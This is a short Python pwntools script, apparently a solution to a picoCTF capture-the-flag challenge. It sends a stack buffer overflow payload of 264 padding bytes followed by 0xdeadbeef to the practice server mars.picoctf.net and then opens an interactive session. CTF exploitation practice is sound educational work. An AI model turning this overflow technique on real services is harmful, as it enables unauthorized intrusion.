from pwn import *

offset = 0x108 # 264

payload = flat(b'A' * offset, 0xdeadbeef)

sh = remote('mars.picoctf.net', 31890)

sh.sendlineafter('see?\n', payload)

sh.interactive()
